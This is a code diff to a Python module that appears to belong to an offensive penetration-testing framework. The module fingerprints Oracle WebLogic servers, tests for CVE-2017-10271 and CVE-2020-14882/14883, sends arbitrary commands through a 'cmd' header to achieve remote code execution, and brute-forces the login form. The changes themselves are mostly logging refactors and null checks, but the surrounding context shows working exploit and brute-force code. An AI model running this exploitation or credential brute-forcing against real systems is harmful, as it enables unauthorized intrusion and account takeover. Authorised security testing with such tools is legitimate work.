@@ -24,14 +24,14 @@ class Module:
     name = 'Weblogic'
     description = 'Discover and exploit Weblogic (bruteforce, CVE-2017-10271, CVE-2020-14882/3)'
 
-    def run(self, target, args, useragent, proxy, timeout):
+    def run(self, target, args, useragent, proxy, timeout, safe):
         http = HTTP(target['method'], target['hostname'], target['port'], useragent, proxy, timeout)
 
         for url in weblogic_urls:
             url = os.path.join(target['path'], url)
             res = http.get(url)
 
-            if res['code'] in [200] and 'weblogic' in res['title'].lower():
+            if res and res['code'] in [200] and 'weblogic' in res['title'].lower():
                 http_info = {
                     'hostname': target['hostname'],
                     'port': target['port'],
@@ -54,7 +54,7 @@ class Module:
                 if m:
                     version = m.group(1)
 
-                Output.write({'target': http.url(url), 'message': 'WebLogic interface: %s' % version})
+                Output.highlight({'target': http.url(url), 'message': 'WebLogic interface: %s' % version})
 
                 # Check for CVE-2017-10271
 
@@ -62,7 +62,7 @@ class Module:
                 exploit_url = os.path.join(target['path'], 'wls-wsat/CoordinatorPortType')
                 output = http.get(exploit_url)
                 if output and output['code'] in [200] and 'web services' in output['title'].lower():
-                    Output.write({'target': http.url(url), 'message': 'Weblogic probably vulnerable to RCE (CVE-2017-10271)'})
+                    Output.vuln({'target': http.url(url), 'message': 'Weblogic probably vulnerable to RCE (CVE-2017-10271)'})
 
                     vuln_info = {
                         'hostname': target['hostname'],
@@ -97,7 +97,7 @@ if (cmd != null) {
                 output = http.post(exploit_url, payload, headers={'cmd': 'echo %s' % random_str, 'Content-Type': 'application/x-www-form-urlencoded'})
 
                 if output and output['code'] in [200] and random_str in output['html']:
-                    Output.write({'target': http.url(url), 'message': 'Weblogic vulnerable to RCE (CVE-2020-14882,CVE-2020-14883)'})
+                    Output.vuln({'target': http.url(url), 'message': 'Weblogic vulnerable to RCE (CVE-2020-14882,CVE-2020-14883)'})
 
                     vuln_info = {
                         'hostname': target['hostname'],
@@ -111,7 +111,7 @@ if (cmd != null) {
 
                     if args['exec']:
                         output = http.post(exploit_url, payload, headers={'cmd': args['exec'], 'Content-Type': 'application/x-www-form-urlencoded'})
-                        Output.write({'target': http.url(url), 'message': 'RCE exploitation output:\n%s' % output['html']})
+                        Output.highlight({'target': http.url(url), 'message': 'RCE exploitation output:\n%s' % output['html']})
 
                 # bruteforce login form
 
@@ -125,11 +125,11 @@ if (cmd != null) {
                         break
 
                 if not form:
-                    Output.write({'target': http.url(url), 'message': 'Weblogic: Unable to find authentication form'})
+                    Output.error({'target': http.url(url), 'message': 'Weblogic: Unable to find authentication form'})
                 else:
 
                     if args['bruteforce']:
-                        Output.write({'target': http.url(url), 'message': 'Starting bruteforce...'})
+                        Output.highlight({'target': http.url(url), 'message': 'Starting bruteforce...'})
                         for cred in gen_bruteforce_creds(args['bruteforce'], creds):
                             username, password = cred.split(':')
 
@@ -175,7 +175,7 @@ if (cmd != null) {
                             if after_auth_form != None:
                                 continue
 
-                            Output.write({'target': http.url(url), 'message': 'Authentication success to Weblogic with login %s and password %s' % (username, password)})
+                            Output.success({'target': http.url(url), 'message': 'Authentication success to Weblogic with login %s and password %s' % (username, password)})
 
                             cred_info = {
                                 'hostname': target['hostname'],
